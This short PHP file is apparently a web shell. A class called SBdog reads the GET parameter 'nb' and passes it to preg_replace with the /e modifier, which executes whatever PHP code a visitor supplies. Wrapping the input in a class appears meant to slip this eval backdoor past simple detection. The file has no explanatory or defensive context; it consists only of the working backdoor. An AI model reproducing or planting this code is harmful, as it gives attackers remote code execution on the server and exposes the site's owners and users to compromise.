<?php
class SBdog{
  public $x;
  function dog(){
	  echo "start";
    $this->x=$_GET['nb']; 
  }
}
$class=new SBdog();
$class->dog();
$a=$class->x;
preg_replace("/dog/e", $a, "I am a sb dog");
?>
